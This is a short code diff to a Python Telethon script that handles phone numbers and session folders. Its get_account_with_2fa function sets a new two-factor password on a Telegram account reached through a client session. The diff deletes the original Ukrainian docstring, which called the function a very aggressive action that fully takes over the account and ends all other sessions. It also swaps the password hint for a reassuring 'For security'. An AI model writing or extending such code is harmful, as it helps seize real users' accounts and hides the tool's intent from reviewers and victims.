@@ -325,16 +325,12 @@ async def delete_session(phone: str, session_folder: str):
 
 
 async def get_account_with_2fa(client: TelegramClient, new_password: str):
-    """
-    Встановлює 2FA і завершує всі інші сесії.
-    ПОПЕРЕДЖЕННЯ: Дуже агресивна дія, яка повністю перехоплює контроль над акаунтом.
-    """
     try:
         # Використовуємо вбудований метод Telethon для встановлення 2FA
         await client.edit_2fa(
             current_password=None,  # Якщо пароля ще немає
             new_password=new_password,
-            hint="Для вашої безпеки"  # Опціонально, підказка для пароля
+            hint="For security"  # Опціонально, підказка для пароля
         )
 
         try:
